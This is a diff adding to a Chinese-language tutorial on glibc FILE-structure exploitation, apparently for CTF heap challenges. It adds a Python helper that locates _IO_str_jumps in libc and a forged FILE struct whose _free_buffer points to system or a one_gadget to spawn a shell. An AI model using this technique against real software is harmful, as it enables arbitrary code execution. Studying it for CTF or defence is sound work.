@@ -291,3 +291,36 @@ typedef struct _IO_strfile_
 最后构造`fp->_s._free_buffer`为`system_addr`或`one gadget`即可`getshell`。  
 由于`libc`中没有`_IO_str_jump`的符号，因此可以通过`_IO_str_jumps`是`vtable`中的倒数第二个表，用`vtable`的最后地址减去`0x168`定位。  
 也可以用如下函数进行定位：
+```python
+# libc.address = libc_base
+def get_IO_str_jumps():
+    IO_file_jumps_addr = libc.sym['_IO_file_jumps']
+    IO_str_underflow_addr = libc.sym['_IO_str_underflow']
+    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
+        possible_IO_str_jumps_addr = ref - 0x20
+        if possible_IO_str_jumps_addr > IO_file_jumps_addr:
+            return possible_IO_str_jumps_addr
+```
+可以进行如下构造：
+```
+._chain => chunk_addr
+chunk_addr
+{
+  file = {
+    _flags = 0x0,
+    _IO_read_ptr = 0x0,
+    _IO_read_end = 0x0,
+    _IO_read_base = 0x0,
+    _IO_write_base = 0x0,
+    _IO_write_ptr = 0x1,
+    _IO_write_end = 0x0,
+    _IO_buf_base = bin_sh_addr,
+      ...
+      _mode = 0x0, //一般不用特意设置
+      _unused2 = '\000' <repeats 19 times>
+  },
+  vtable = _IO_str_jumps-8 //chunk_addr + 0xd8 ~ +0xe0
+}
++0xe0 ~ +0xe8 : 0x0
++0xe8 ~ +0xf0 : system_addr / one_gadget //fp->_s._free_buffer
+```
